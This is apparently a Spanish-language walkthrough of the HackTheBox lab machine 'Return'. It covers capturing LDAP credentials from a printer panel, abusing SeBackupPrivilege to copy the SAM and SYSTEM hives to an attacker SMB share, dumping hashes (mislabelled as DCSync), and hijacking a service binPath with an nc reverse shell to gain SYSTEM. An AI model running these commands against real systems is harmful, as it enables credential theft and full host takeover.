---
tags:
title: Return - Easy (HTB)
permalink: /Return-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49679,49682,49694 10.10.11.108
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-10 17:28 EDT
Nmap scan report for 10.10.11.108
Host is up (0.51s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-10 21:47:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 18m34s
| smb2-time: 
|   date: 2025-10-10T21:48:16
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.24 seconds
```

# Service enumeration

### Port 80

![Untitled 56 1](images/Untitled 56 1.jpg)

Una pagina web es lo que vemos y si nos vamos a la seccion de `settings`, vemos lo siguiente.

![Untitled 57 1](images/Untitled 57 1.jpg)

Si intentamos editar los datos del "formulario" y le damos a `update` los datos quedan iguales, por lo que podriamos tratar de ver el comportamiento si me pongo en escucha con `nc` ya que ademas la contraseña no esta en texto claro. y capaz recibamos la misma.

### Shell as `svc-printer`
Asi que ponemos nuestra `ip` y ejecutamos el `update`.

```bash
nc -nlvp 389                                
listening on [any] 389 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.108] 63282
0*`%return\svc-printer�
                       1edFg43012!!
```

Vemos que con exito podemos leer la contraseña del usuario `svc-printer`. Chequeando que sea valido con `evil-winrm` vemos que si asi que nos conectamos.

```bash
evil-winrm -i 10.10.10.108 -u svc-printer -p '1edFg43012!!'
```

Y con exito nos conectamos.
```bash
*Evil-WinRM* PS C:\Users\svc-printer\desktop> whoami /priv
```

Listando grupos vemos que somos parte de `SeBackupPrivilege` un viejo conocido por lo que podriamos guardar la `sam` y la `system` y enviarla a nuestro equipo
```bash
*Evil-WinRM* PS C:\Users\svc-printer\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

Nos creamos un directorio temporal donde guardar los archivos. Y los guardamos

```bash
*Evil-WinRM* PS C:\Users\svc-printer\desktop> cd c:\
*Evil-WinRM* PS C:\> mkdir Temp


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/10/2025   3:26 PM                Temp


*Evil-WinRM* PS C:\> reg save hklm\sam c:\Temp\sam
The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\system c:\Temp\system
The operation completed successfully.
```

Nos creamos un servidor `SMB` para poder enviarnos los archivos.

```bash
impacket-smbserver -smb2support smbFolder $(pwd)
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Y desde la maquina nos lo copiamos a nuestro recurso compartido.

```powershell
copy c:\Temp\system \\10.10.16.2\smbFolder
copy c:\Temp\sam \\10.10.16.2\smbFolder
```

Y con `secretsdump` performamos un `DCSync`.

```bash
impacket-secretsdump -sam sam -system system LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xa42289f69adb35cd67d02cc84e69c314
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:34386a771aaca697f447754e4863d38a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

Vamos a ver que si nos intentamos loguear como el user `administrator` no vamos a tener exito. asi que volvemos a la maquina a ver que mas podemos enumerar.

```powershell
whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

Vemos que ademas de ser parte del grupo `Print Operators` ademas somos parte de `Server Operator` esto es muy interesante.

>El grupo `Server Operator` es un grupo de usuarios especial que a menudo tiene acceso a comandos y configuraciones potentes en un sistema informático. Este grupo se utiliza normalmente para administrar un servidor o para solucionar problemas del sistema. Los operadores de servidores suelen ser responsables de supervisar el rendimiento del servidor, administrar la seguridad del sistema y proporcionar soporte técnico a los usuarios. También pueden supervisar la instalación de actualizaciones de software, la creación y el mantenimiento de cuentas de usuario, y la realización de tareas de mantenimiento de rutina.

En si, ser miembro de este grupo no es una vulnerabilidad, pero ser miembro de este grupo nos brinda ciertos privilegios de hacer `cambios` en el dominio con los cuales un atacante puede escalar a `privilegios del sistema`. Podemos usar el comando `services` con el que podemos ver los servicios que corren actualmente en el sistema.

```powershell
services

Path                                                                                                                 Privileges Service          
----                                                                                                                 ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense            
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc
```

Es asi como vemos el nombre del servicio `VMTools` y con su ruta binaria para el uso lateral.

### Como funciona? 

Bueno, cuando se ejecuta un servicio el mismo se ejecuta desde su `Binary Path (Ruta binaria)`.Entonces si por ejemplo, reemplazamos en el `path` el servicio con el binario `nc.exe` con una sentencia para una `reverse shell`, el servicio va a iniciar en el host que se indica en el path.

Algo como esto.

Primero subimos el nc.exe.

```powershell 
upload nc.exe
```

Y ahora reemplazamos el `Path`.

```powershell
sc.exe config VMTools binPath="C:\Users\svc-printer\desktop\nc.exe -e cmd.exe 10.10.16.2 443"
[SC] ChangeServiceConfig SUCCESS
```

Y luego paramos el servicio y lo volvemos a iniciar, asi cuando se vuelva a iniciar va a ejecutarse desde el `Path` que seteamos anteriormente.

```powershell
Evil-WinRM PS C:\Users\svc-printer\desktop> sc.exe stop VMTools

SERVICE_NAME: VMTools
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Y lo volvemos a iniciar.

```powershell
sc.exe start VMTools
```

Y desde nuestro listener anteriormente configurado, recibimos nuestra shell.

```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.108] 61901
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

`~Happy Hacking`


